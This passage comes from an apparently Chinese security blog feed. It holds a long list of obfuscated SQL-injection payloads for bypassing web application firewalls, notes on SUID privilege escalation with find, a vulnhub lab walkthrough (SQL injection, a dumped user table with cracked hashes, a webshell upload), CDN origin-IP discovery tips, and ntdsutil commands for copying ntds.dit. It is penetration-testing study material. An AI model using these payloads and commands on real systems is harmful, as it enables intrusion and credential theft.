class="line">&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;</span><br><span class="line">&#x2F;**&#x2F;uNIon&#x2F;**&#x2F;sEleCt&#x2F;**&#x2F;</span><br><span class="line">+%2F**&#x2F;+Union&#x2F;*!select*&#x2F;</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!union*&#x2F;&#x2F;**&#x2F;&#x2F;*!select*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">&#x2F;*!uNIOn*&#x2F; &#x2F;*!SelECt*&#x2F;</span><br><span class="line">+union+distinct+select+</span><br><span class="line">+union+distinctROW+select+</span><br><span class="line">uNiOn aLl sElEcT</span><br><span class="line">UNIunionON+SELselectECT</span><br><span class="line">&#x2F;**&#x2F;union&#x2F;*!50000select*&#x2F;&#x2F;**&#x2F;</span><br><span class="line">0%a0union%a0select%09</span><br><span class="line">%0Aunion%0Aselect%0A</span><br><span class="line">%55nion&#x2F;**&#x2F;%53elect</span><br><span class="line">uni&lt;on all&#x3D;&quot;&quot; sel&#x3D;&quot;&quot;&gt;&#x2F;*!20000%0d%0aunion*&#x2F;+&#x2F;*!20000%0d%0aSelEct*&#x2F;</span><br><span class="line">%252f%252a*&#x2F;UNION%252f%252a &#x2F;SELECT%252f%252a*&#x2F;</span><br><span class="line">%0A%09UNION%0CSELECT%10NULL%</span><br><span class="line">&#x2F;*!union*&#x2F;&#x2F;*--*&#x2F;&#x2F;*!all*&#x2F;&#x2F;*--*&#x2F;&#x2F;*!select*&#x2F;</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">&#x2F;*!20000%0d%0aunion*&#x2F;+&#x2F;*!20000%0d%0aSelEct*&#x2F;</span><br><span class="line">+UnIoN&#x2F;*&amp;a&#x3D;*&#x2F;SeLeCT&#x2F;*&amp;a&#x3D;*&#x2F;</span><br><span class="line">union+sel%0bect</span><br><span class="line">+uni*on+sel*ect+</span><br><span class="line">+#1q%0Aunion all#qa%0A#%0Aselect</span><br><span class="line">union(select (1),(2),(3),(4),(5))</span><br><span class="line">UNION(SELECT(column)FROM(table))</span><br><span class="line">%23xyz%0AUnIOn%23xyz%0ASeLecT+</span><br><span class="line">%23xyz%0A%55nIOn%23xyz%0A%53eLecT+</span><br><span class="line">union(select(1),2,3)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">uNioN (&#x2F;*!&#x2F;**&#x2F; SeleCT *&#x2F; 11)</span><br><span class="line">union (select 1111,2222,3333)</span><br><span class="line">+#1q%0AuNiOn all#qa%0A#%0AsEleCt</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*U*&#x2F;&#x2F;*n*&#x2F;&#x2F;*I*&#x2F;&#x2F;*o*&#x2F;&#x2F;*N*&#x2F;&#x2F;*S*&#x2F;&#x2F;*e*&#x2F;&#x2F;*L*&#x2F;&#x2F;*e*&#x2F;&#x2F;*c*&#x2F;&#x2F;*T*&#x2F;</span><br><span class="line">%0A&#x2F;**&#x2F;&#x2F;*!50000%55nIOn*&#x2F;&#x2F;*yoyu*&#x2F;all&#x2F;**&#x2F;%0A&#x2F;*!%53eLEct*&#x2F;%0A&#x2F;*nnaa*&#x2F;</span><br><span class="line">+%23sexsexsex%0AUnIOn%23sexsexs ex%0ASeLecT+</span><br><span class="line">+union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A1% 2C2%2C</span><br><span class="line">&#x2F;*!f****U%0d%0aunion*&#x2F;+&#x2F;*!f****U%0d%0aSelEct*&#x2F;</span><br><span class="line">+%23blobblobblob%0aUnIOn%23blobblobblob%0aSeLe cT+</span><br><span class="line">&#x2F;*!blobblobblob%0d%0aunion*&#x2F;+&#x2F;*!blobblobblob%0d%0aSelEct*&#x2F;</span><br><span class="line">&#x2F;union\sselect&#x2F;g</span><br><span class="line">&#x2F;union\s+select&#x2F;i</span><br><span class="line">&#x2F;*!UnIoN*&#x2F;SeLeCT</span><br><span class="line">+UnIoN&#x2F;*&amp;a&#x3D;*&#x2F;SeLeCT&#x2F;*&amp;a&#x3D;*&#x2F;</span><br><span class="line">+uni&gt;on+sel&gt;ect+</span><br><span class="line">+(UnIoN)+(SelECT)+</span><br><span class="line">+(UnI)(oN)+(SeL)(EcT)</span><br><span class="line">+’UnI”On’+&#39;SeL”ECT’</span><br><span class="line">+uni on+sel ect+</span><br><span class="line">+&#x2F;*!UnIoN*&#x2F;+&#x2F;*!SeLeCt*&#x2F;+</span><br><span class="line">&#x2F;*!u%6eion*&#x2F; &#x2F;*!se%6cect*&#x2F;</span><br><span class="line">uni%20union%20&#x2F;*!select*&#x2F;%20</span><br><span class="line">union%23aa%0Aselect</span><br><span class="line">&#x2F;**&#x2F;union&#x2F;*!50000select*&#x2F;</span><br><span class="line">&#x2F;^.*union.*$&#x2F; &#x2F;^.*select.*$&#x2F;</span><br><span class="line">&#x2F;*union*&#x2F;union&#x2F;*select*&#x2F;select+</span><br><span class="line">&#x2F;*uni X on*&#x2F;union&#x2F;*sel X ect*&#x2F;</span><br><span class="line">+un&#x2F;**&#x2F;ion+sel&#x2F;**&#x2F;ect+</span><br><span class="line">+UnIOn%0d%0aSeleCt%0d%0a</span><br><span class="line">UNION&#x2F;*&amp;test&#x3D;1*&#x2F;SELECT&#x2F;*&amp;pwn&#x3D;2*&#x2F;</span><br><span class="line">un?&lt;ion sel&#x3D;&quot;&quot;&gt;+un&#x2F;**&#x2F;ion+se&#x2F;**&#x2F;lect+</span><br><span class="line">+UNunionION+SEselectLECT+</span><br><span class="line">+uni%0bon+se%0blect+</span><br><span class="line">%252f%252a*&#x2F;union%252f%252a &#x2F;select%252f%252a*&#x2F;</span><br><span class="line">&#x2F;%2A%2A&#x2F;union&#x2F;%2A%2A&#x2F;select&#x2F;%2A%2A&#x2F;</span><br><span class="line">%2f**%2funion%2f**%2fselect%2f**%2f</span><br><span class="line">union%23foo*%2F*bar%0D%0Aselect%23foo%0D%0A</span><br><span class="line">&#x2F;*!UnIoN*&#x2F;SeLecT+</span><br></pre></td></tr></table></figure>

<h3 id="Concat"><a href="#Concat" class="headerlink" title="Concat"></a>Concat</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CoNcAt()</span><br><span class="line">concat() </span><br><span class="line">CON%08CAT()</span><br><span class="line">CoNcAt()</span><br><span class="line">%0AcOnCat()</span><br><span class="line">&#x2F;**&#x2F;&#x2F;*!12345cOnCat*&#x2F;</span><br><span class="line">&#x2F;*!50000cOnCat*&#x2F;(&#x2F;*!*&#x2F;)</span><br><span class="line">unhex(hex(concat(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!12345concat*&#x2F;(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!50000concat*&#x2F;(table_name)))</span><br></pre></td></tr></table></figure>

<h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat"></a>group_concat</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*!group_concat*&#x2F;()</span><br><span class="line">gRoUp_cOnCAt()</span><br><span class="line">group_concat(&#x2F;*!*&#x2F;)</span><br><span class="line">group_concat(&#x2F;*!12345table_name*&#x2F;)</span><br><span class="line">group_concat(&#x2F;*!50000table_name*&#x2F;)</span><br><span class="line">&#x2F;*!group_concat*&#x2F;(&#x2F;*!12345table_name*&#x2F;)</span><br><span class="line">&#x2F;*!group_concat*&#x2F;(&#x2F;*!50000table_name*&#x2F;)</span><br><span class="line">&#x2F;*!12345group_concat*&#x2F;(&#x2F;*!12345table_name*&#x2F;)</span><br><span class="line">&#x2F;*!50000group_concat*&#x2F;(&#x2F;*!50000table_name*&#x2F;)</span><br><span class="line">&#x2F;*!GrOuP_ConCaT*&#x2F;()</span><br><span class="line">&#x2F;*!12345GroUP_ConCat*&#x2F;()</span><br><span class="line">&#x2F;*!50000gRouP_cOnCaT*&#x2F;()</span><br><span class="line">&#x2F;*!50000Gr%6fuP_c%6fnCAT*&#x2F;()</span><br><span class="line">unhex(hex(group_concat(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!group_concat*&#x2F;(&#x2F;*!table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!12345group_concat*&#x2F;(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!12345group_concat*&#x2F;(&#x2F;*!table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!12345group_concat*&#x2F;(&#x2F;*!12345table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!50000group_concat*&#x2F;(table_name)))</span><br><span class="line">unhex(hex(&#x2F;*!50000group_concat*&#x2F;(&#x2F;*!table_name*&#x2F;)))</span><br><span class="line">unhex(hex(&#x2F;*!50000group_concat*&#x2F;(&#x2F;*!50000table_name*&#x2F;)))</span><br><span class="line">convert(group_concat(table_name)+using+ascii)</span><br><span class="line">convert(group_concat(&#x2F;*!table_name*&#x2F;)+using+ascii)</span><br><span class="line">convert(group_concat(&#x2F;*!12345table_name*&#x2F;)+using+ascii)</span><br><span class="line">convert(group_concat(&#x2F;*!50000table_name*&#x2F;)+using+ascii)</span><br><span class="line">CONVERT(group_concat(table_name)+USING+latin1)</span><br></pre></td></tr></table></figure>

<h3 id="Information-schema-tables"><a href="#Information-schema-tables" class="headerlink" title="Information_schema.tables"></a>Information_schema.tables</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F;&#x3D;schEMA()-- -</span><br><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F; like schEMA()-- -</span><br><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F;&#x3D;database()-- -</span><br><span class="line">&#x2F;*!froM*&#x2F; &#x2F;*!InfORmaTion_scHema*&#x2F;.tAblES &#x2F;*!WhERe*&#x2F; &#x2F;*!TaBle_ScHEmA*&#x2F; like database()-- -</span><br><span class="line">&#x2F;*!FrOm*&#x2F;+%69nformation_schema.&#x2F;**&#x2F;columns+&#x2F;*!50000Where*&#x2F;+&#x2F;*!%54able_name*&#x2F;&#x3D;hex table</span><br><span class="line">&#x2F;*!FrOm*&#x2F;+information_schema.&#x2F;**&#x2F;columns+&#x2F;*!12345Where*&#x2F;+&#x2F;*!%54able_name*&#x2F; like hex table</span><br></pre></td></tr></table></figure>

<br>

<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92">https://mp.weixin.qq.com/s?__biz=Mzg3NDQzMDg0MQ==&amp;mid=2247499025&amp;idx=1&amp;sn=90afd42d92e404d30792b6ee92597b92</a></p>
<p><a href="https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad">https://y000o.medium.com/how-to-bypass-mod-security-waf-156e2315b8ad</a></p>
</blockquote>
]]></content>
      <categories>
        <category>bypass</category>
      </categories>
      <tags>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title>find命令与提权</title>
    <url>/posts/355e240e/</url>
    <content><![CDATA[<h3 id="find命令"><a href="#find命令" class="headerlink" title="find命令"></a>find命令</h3><table>
<thead>
<tr>
<th>选项</th>
<th></th>
</tr>
</thead>
<tbody><tr>
<td>–help  -help</td>
<td>帮助</td>
</tr>
<tr>
<td>-name</td>
<td>按文件名查找</td>
</tr>
<tr>
<td>-iname</td>
<td>效果与-name类似，但忽略字符大小写</td>
</tr>
<tr>
<td>-type</td>
<td>只寻找符合指定的文件类型的文件,  d 目录       f 文件        c 字符设备文件         b 块设备文件</td>
</tr>
<tr>
<td>-print</td>
<td>将文件或目录名称列出到标准输出。格式为每列一个名称，每个名称前皆有”./“字符串</td>
</tr>
<tr>
<td>-prune</td>
<td>如果文件是一个目录，就不会进入此目录</td>
</tr>
<tr>
<td>-size n</td>
<td>n是文件大小单位</td>
</tr>
<tr>
<td>-perm</td>
<td>按照文件权限来查找文件，4000，2000,1000为分别表示SUID,SGID,SBIT，如777为普通文件的最高权限，7000为特殊文件的最高权限</td>
</tr>
<tr>
<td>-exec</td>
<td>find命令对匹配的文件执行该参数所给出的shell命令。相应命令的形式为’command’ { } ;，注意{ }和\；之间的空格</td>
</tr>
</tbody></table>
<p>实例</p>
<p><code>find .</code> 列出当前目录及子目录下的所有文件和文件夹</p>
<p><code>find .  -name  &quot;*-txt&quot;</code>  找出当前文件加下的.txt文件</p>
<p><code>find . -nmae &quot;*.txt&quot; -o -name &quot;*.py&quot;</code> 找出当前文件夹下的.txt文件和子目录下的.py文件</p>
<p><code>find . ! -name  &quot;*-txt&quot; </code> 找出当前目录下不为.txt的文件</p>
<p><code>find . -type &lt;类型参数&gt;</code></p>
<table>
<thead>
<tr>
<th>类型参数</th>
<th>含义</th>
</tr>
</thead>
<tbody><tr>
<td>f</td>
<td>普通文件</td>
</tr>
<tr>
<td>d</td>
<td>目录</td>
</tr>
<tr>
<td>p</td>
<td>管道FIFO</td>
</tr>
<tr>
<td>s</td>
<td>套接字</td>
</tr>
<tr>
<td>l</td>
<td>符号连接</td>
</tr>
<tr>
<td>b</td>
<td>块设备</td>
</tr>
<tr>
<td>c</td>
<td>字符设备</td>
</tr>
</tbody></table>
<p><code>find . -type f -name &quot;*-txt&quot;  -delete </code> 删除匹配的txt文件</p>
<p><code>find  -perm -777  -type f | sort</code> 查找权限为777的文件或目录并排序</p>
<p><code>find -type f -name &quot;*.txt&quot; -exec cat &#123;&#125; \; &gt; all.txt</code> 将所有的txt文件拼接并写入到all.txt</p>
<p>单行命令的-exec无法执行多个命令，执行多行命令的话就需要创建一个test.sh  这里为了方便直接给777权限 <code>chmod 777 test.sh</code></p>
<p>test.sh 内容为下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls</span><br><span class="line">cat all.txt</span><br></pre></td></tr></table></figure>

<p><code>find &#39;all.txt&#39; -exec  ./test.sh  &#123;&#125; \;</code></p>
<p><img src="/posts/355e240e/find_exec_sh.png"></p>
<h3 id="2-gt-dev-null"><a href="#2-gt-dev-null" class="headerlink" title="2&gt; /dev/null"></a>2&gt; /dev/null</h3><br>

<p>文件描述符</p>
<p>0    标准输入(stdin)</p>
<p>1    标准输出(stdout)</p>
<p>2    标准错误(stderror)</p>
<p>重定向</p>
<p><code>&gt;</code> 清空文件 再写入内容</p>
<p><code>&gt;&gt;</code> 追加到文件尾部</p>
<p><code>2&gt;/dev/null</code><br>意思就是把错误输出到“黑洞”</p>
<p><code>&gt;/dev/null 2&gt;&amp;1</code></p>
<p>默认情况是1，也就是等同于1&gt;/dev/null 2&gt;&amp;1。意思就是把标准输出重定向到“黑洞”，还把错误输出2重定向到标准输出1，也就是标准输出和错误输出都进了“黑洞”<br><code>2&gt;&amp;1 &gt;/dev/null</code><br>意思就是把错误输出2重定向到标准出书1，也就是屏幕，标准输出进了“黑洞”，也就是标准输出进了黑洞，错误输出打印到屏幕</p>
<h3 id="Linux下的权限"><a href="#Linux下的权限" class="headerlink" title="Linux下的权限"></a>Linux下的权限</h3><p>Linux下权限的属组有 拥有者 、群组 、其它组 三种，设置不同的rwx权限。</p>
<p>Linux下文件的权限类型一般包括读，写，执行，即r，w，x。</p>
<blockquote>
<p>r=4，w=2，x=1<br>rwx = 4 + 2 + 1 = 7<br>rw = 4 + 2 = 6<br>rx = 4 +1 = 5</p>
</blockquote>
<p>一般表示一个文件所有权限详情的有两种方式</p>
<p>一种是十进制，十进制的常用表示形式</p>
<blockquote>
<p>-rw——- (600)    只有拥有者有读写权限。<br>-rw-r–r– (644)    只有拥有者有读写权限；而属组用户和其他用户只有读权限。<br>-rwx—— (700)    只有拥有者有读、写、执行权限。<br>-rwxr-xr-x (755)    拥有者有读、写、执行权限；而属组用户和其他用户只有读、执行权限。<br>-rwx–x–x (711)    拥有者有读、写、执行权限；而属组用户和其他用户只有执行权限。<br>-rw-rw-rw- (666)    所有用户都有文件读、写权限。<br>-rwxrwxrwx (777)    所有用户都有读、写、执行权限。</p>
</blockquote>
<p>另一种是十二进制</p>
<p>linux除了设置正常的读写操作权限外，还有关于一类设置也是涉及到权限，叫做Linxu附加权限。包括 SET位权限（suid，sgid）和粘滞位权限（sticky）</p>
<p>s权限(SetUID，SetGID)</p>
<p>SetUID    只能应用于二进制可执行文件*</p>
<p>SetGID    可应用于二进制可执行文件*和目录</p>
<p>4代表SetUID，2代表SetGID，6则是两者都置位</p>
<p><code>chmod 4777 xxx</code></p>
<p><code>chmod 2777 xxx</code></p>
<p><code>chmod 6777 xxx</code></p>
<p><code>chmod </code></p>
<br>

<h3 id="find提权"><a href="#find提权" class="headerlink" title="find提权"></a>find提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://blog.csdn.net/weixin_45596239/article/details/102844386">https://blog.csdn.net/weixin_45596239/article/details/102844386</a><br><a href="https://blog.csdn.net/weixin_44912169/article/details/105845909">https://blog.csdn.net/weixin_44912169/article/details/105845909</a><br><a href="https://blog.csdn.net/gramdog/article/details/80374119">https://blog.csdn.net/gramdog/article/details/80374119</a><br><a href="https://gtfobins.github.io/gtfobins/find/">https://gtfobins.github.io/gtfobins/find/</a></p>
</blockquote>
]]></content>
      <categories>
        <category>提权</category>
      </categories>
      <tags>
        <tag>提权</tag>
      </tags>
  </entry>
  <entry>
    <title>vulnhub-hackme靶机</title>
    <url>/posts/9f82d7d9/</url>
    <content><![CDATA[<p>就简单写写思路，最近开始实习了，也没多少时间去写这种靶场的笔记了</p>
<h3 id="获取靶机ip"><a href="#获取靶机ip" class="headerlink" title="获取靶机ip"></a>获取靶机ip</h3><p><code>arp-scan -l</code> 获取靶机的ip 为 192.168.0.198</p>
<h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p><code>nmap -sV 192.168.0.198</code></p>
<p>开放了22 80端口</p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>使用dirsearch扫描目录</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">39:05] 200 -    0B  - &#x2F;config.php                                          </span><br><span class="line">[17:39:07] 200 -  100B  - &#x2F;index.php                                                         </span><br><span class="line">[17:39:07] 200 -  100B  - &#x2F;index.php&#x2F;login&#x2F;</span><br><span class="line">[17:39:08] 200 -    1KB - &#x2F;login.php                                                       </span><br><span class="line">[17:39:08] 302 -    0B  - &#x2F;logout.php  -&gt;  login.php</span><br><span class="line">[17:39:10] 200 -    2KB - &#x2F;register.php                                                     </span><br><span class="line">[17:39:10] 403 -  302B  - &#x2F;server-status&#x2F;                                              </span><br><span class="line">[17:39:10] 403 -  301B  - &#x2F;server-status</span><br><span class="line">[17:39:11] 301 -  316B  - &#x2F;uploads  -&gt;  http:&#x2F;&#x2F;192.168.0.198&#x2F;uploads&#x2F;                     </span><br><span class="line">[17:39:11] 200 -  940B  - &#x2F;uploads&#x2F;                     </span><br><span class="line">                                         </span><br></pre></td></tr></table></figure>

<p>访问下 <code>/uploads</code> 看到里面内容为上传</p>
<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>访问下80端口，是一个注册登录框</p>
<p>注册后登录 有一个搜索功能，测试了下发现有sql注入</p>
<p><code>a&#39; or 1=1 #</code>  这里<code>--+ </code>不可以，<code>-- </code> 可以</p>
<p>使用order by 没有回显</p>
<p>直接使用union select 试下有几个字段</p>
<p><code>a&#39; union select 1,2,3-- a</code> 发现有三个字段</p>
<p><code>a%27+union+select+version%28%29%2Cdatabase%28%29%2C@@datadir--+a</code></p>
<p>分别得到 <code>5.7.25-0ubuntu0.18.10.2  </code> <code> webapphacking</code> <code> /var/lib/mysql/ SG</code></p>
<p><code>a&#39; union SELECT table_name,2,3 FROM INFORMATION_SCHEMA.TABLES WHERE TABLE_SCHEMA=DATABASE();-- </code></p>
<p>得到<code>users</code> 和 <code>books</code>两个表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Database: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[5 columns]</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| Column  | Type                 |</span><br><span class="line">+---------+----------------------+</span><br><span class="line">| user    | varchar(30)          |</span><br><span class="line">| address | varchar(50)          |</span><br><span class="line">| id      | smallint(5) unsigned |</span><br><span class="line">| name    | varchar(30)          |</span><br><span class="line">| pasword | varchar(70)          |</span><br><span class="line">+---------+----------------------+</span><br></pre></td></tr></table></figure>

<p>   dump得到账户密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">superDatabase: webapphacking</span><br><span class="line">Table: users</span><br><span class="line">[7 entries]</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| id | name         | user       | address        | pasword                                     |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br><span class="line">| 1  | David        | user1      | Newton Circles | 5d41402abc4b2a76b9719d911017c592 (hello)    |</span><br><span class="line">| 2  | Beckham      | user2      | Kensington     | 6269c4f71a55b24bad0f0267d9be5508 (commando) |</span><br><span class="line">| 3  | anonymous    | user3      | anonymous      | 0f359740bd1cda994f8b55330c86d845 (p@ssw0rd) |</span><br><span class="line">| 10 | testismyname | test       | testaddress    | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 11 | superadmin   | superadmin | superadmin     | 2386acb2cf356944177746fc92523983            |</span><br><span class="line">| 12 | test1        | test1      | test1          | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">| 13 | testtest     | testtest   | testtest       | 05a671c66aefea124cc08b76ea6d30bb (testtest) |</span><br><span class="line">+----+--------------+------------+----------------+---------------------------------------------+</span><br></pre></td></tr></table></figure>

<p>但是这条superadmin的密码 sqlmap没有解出来  </p>
<p><a href="https://crackstation.net/">https://crackstation.net/</a> 可以进行破解 最终得到密码为 <code>Uncrackable</code>(用国内的没解出来)</p>
<p>使用superadmin进行登录，登陆后发现有一个上传功能</p>
<h3 id="Getshell"><a href="#Getshell" class="headerlink" title="Getshell"></a>Getshell</h3><p>使用蚁剑直接生成shell.php上传就可以连接，这里没有做防护</p>
<p>得到www-data权限</p>
<p><code>cat /etc/passwd</code></p>
<p>后面发现主机上有两个用户 分别为<code>hackme</code> 和<code> legacy</code></p>
<p>在legacy目录下存在一个可执行文件 运行后发现没反应，后续看了下最后是通过这个文件进行提权的，但是在这里却用不了，用不了就算了，这个靶机还是比较简单，就一个sql注入，最近一直在实习，也没什么时间，周末有时间的话就看看文章，复现下漏洞，打打靶场啥的，弟弟太菜了，努力呀！</p>
]]></content>
      <categories>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>CDN绕过查找真实IP</title>
    <url>/posts/619fb955/</url>
    <content><![CDATA[<h3 id="首先要验证网站是否存在CDN"><a href="#首先要验证网站是否存在CDN" class="headerlink" title="首先要验证网站是否存在CDN"></a>首先要验证网站是否存在CDN</h3><h4 id="一般可以通过多地ping-看对应的IP是否唯一"><a href="#一般可以通过多地ping-看对应的IP是否唯一" class="headerlink" title="一般可以通过多地ping 看对应的IP是否唯一"></a>一般可以通过多地ping 看对应的IP是否唯一</h4><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a><br><a href="http://ping.aizhan.com/">http://ping.aizhan.com/</a><br><a href="http://ce.cloud.360.cn/">http://ce.cloud.360.cn/</a></p>
<h3 id="绕过CDN查真实IP"><a href="#绕过CDN查真实IP" class="headerlink" title="绕过CDN查真实IP"></a>绕过CDN查真实IP</h3><h4 id="查历史CDN记录"><a href="#查历史CDN记录" class="headerlink" title="查历史CDN记录"></a>查历史CDN记录</h4><p><a href="https://dnsdb.io/zh-cn/">https://dnsdb.io/zh-cn/</a> 查询DNS</p>
<p><a href="https://sitereport.netcraft.com/?url=">https://sitereport.netcraft.com/?url=</a> </p>
<p><a href="https://tools.ipip.net/cdn.php">https://tools.ipip.net/cdn.php</a></p>
<h4 id="查询子域名"><a href="#查询子域名" class="headerlink" title="查询子域名"></a>查询子域名</h4><p>有些网站可能只会对主站或部分大流量子站做CDN，而很多小站或者子站刚好又和主站在同一台服务器或者同一个C端中，就可以通过查找子域名来寻找真实ip</p>
<h5 id="在线子域名机器"><a href="#在线子域名机器" class="headerlink" title="在线子域名机器"></a>在线子域名机器</h5><p><code>https://dnsdb.io/zh-cn/</code> 输入 baidu.com type:A 就可以搜集其子域名和ip</p>
<h5 id="google语法"><a href="#google语法" class="headerlink" title="google语法"></a>google语法</h5><p><code>site:baidu.com -www</code>  可以查看排除www的子域名</p>
<h5 id="子域名扫描器"><a href="#子域名扫描器" class="headerlink" title="子域名扫描器"></a>子域名扫描器</h5><ul>
<li>layer子域名挖掘机</li>
<li>lijiejie的subdomainbrute</li>
</ul>
<h4 id="使用Fofa-shodan-zoomeye"><a href="#使用Fofa-shodan-zoomeye" class="headerlink" title="使用Fofa shodan zoomeye"></a>使用Fofa shodan zoomeye</h4><p>一般常用Fofa 可以通过 title body  ip 等语法进行查询</p>
<h4 id="利用SSL证书寻找真实IP"><a href="#利用SSL证书寻找真实IP" class="headerlink" title="利用SSL证书寻找真实IP"></a>利用SSL证书寻找真实IP</h4><p>可以使用 <code>https://censys.io/</code> 进行查询</p>
<h4 id="通过icon-hash查ip"><a href="#通过icon-hash查ip" class="headerlink" title="通过icon hash查ip"></a>通过icon hash查ip</h4><p>一般先将 favicon.ico 保存到本地，然后上传到fofa上即可</p>
<h4 id="使用国外主机解析域名"><a href="#使用国外主机解析域名" class="headerlink" title="使用国外主机解析域名"></a>使用国外主机解析域名</h4><p>有些国内的CDN厂可能只做了国内线路，而针对国外的线路可能几乎没有，所以尝试使用国外的主机去访问可能会得到真实ip</p>
<h4 id="通过网站漏洞查找真实ip"><a href="#通过网站漏洞查找真实ip" class="headerlink" title="通过网站漏洞查找真实ip"></a>通过网站漏洞查找真实ip</h4><p>可以通过phpinfo之类的探针，xss. ssrf, 命令执行反弹shell 源码泄漏 敏感信息泄漏之类</p>
<h4 id="F5-LTM解码法（还没尝试过，抽时间测试下）"><a href="#F5-LTM解码法（还没尝试过，抽时间测试下）" class="headerlink" title="F5 LTM解码法（还没尝试过，抽时间测试下）"></a>F5 LTM解码法（还没尝试过，抽时间测试下）</h4><p>当服务器使用F5 LTM做负载均衡时，通过对set-cookie关键字的解码真实ip也可被获取，例如：Set-Cookie: BIGipServerpool_8.29_8030=487098378.24095.0000，先把第一小节的十进制数即487098378取出来，然后将其转为十六进制数1d08880a，接着从后至前，以此取四位数出来，也就是0a.88.08.1d，最后依次把他们转为十进制数10.136.8.29，也就是最后的真实ip。</p>
<br>

<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><blockquote>
<p><a href="https://www.cnblogs.com/qiudabai/p/9763739.html">https://www.cnblogs.com/qiudabai/p/9763739.html</a></p>
<p><a href="https://zhuanlan.zhihu.com/p/33440472">https://zhuanlan.zhihu.com/p/33440472</a></p>
</blockquote>
]]></content>
  </entry>
  <entry>
    <title>ntds.dit导出及解析</title>
    <url>/posts/77c245ea/</url>
    <content><![CDATA[<h3 id="提取ntds-dit"><a href="#提取ntds-dit" class="headerlink" title="提取ntds.dit"></a>提取ntds.dit</h3><h4 id="使用ntdsutil-工具提取"><a href="#使用ntdsutil-工具提取" class="headerlink" title="使用ntdsutil 工具提取"></a>使用ntdsutil 工具提取</h4><p>ntdsutil.exe是一个为活动目录提供管理机制的命令行工具。使用ntdsutil.exe可以维护和管理互动目录数据库、控制单个主机操作、创建应用程序目录分区、删除由未使用活动目录安装向导（DCPRome.exe）成功降级的域控制器留下的元数据等。该工具默认安装在域控制器上，可以在域控制器上直接操作，可以通过域内机器在域控制器上远程操作。</p>
<p>ntdsutil.exe 支持的操作系统包括 Windows server 2003 ，Windows server 2008，Windows server 2012</p>
<p> 使用方法如下</p>
<h5 id="创建快照"><a href="#创建快照" class="headerlink" title="创建快照"></a>创建快照</h5><p>该快照包含windows中的所有文件，且在复制文件时不会受到windows锁定机制的限制</p>
<p><code>ntdsutil snapshot &quot;activate instance ntds&quot; create quit quit</code></p>
<p>{}内为快照的GUID</p>
<p><img src="/posts/77c245ea/ntdsutil_create_snapshot.png"></p>
<h5 id="挂载快照"><a href="#挂载快照" class="headerlink" title="挂载快照"></a>挂载快照</h5><p><code>ntdsutil snapshot &quot;mount &#123;GUID&#125;&quot; quit quit</code></p>
<p><img src="/posts/77c245ea/ntdsutil_load_snapshot.png"></p>
<h5 id="拷贝快照"><a href="#拷贝快照" class="headerlink" title="拷贝快照"></a>拷贝快照</h5><p>使用windows自带的copy命令将快照中的文件复制出来,将快照中的<code>C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit</code>复制到本地计算机的 <code>C:\Users\Administrator\Desktop\</code> 桌面上</p>
<p><code>copy C:\$SNAP_202107122344_VOLUMEC$\windows\ntds\ntds.dit C:\Users\Administrator\Desktop\ntds.dit</code></p>
<p><img src="/posts/77c245ea/copy_ntds.png"></p>
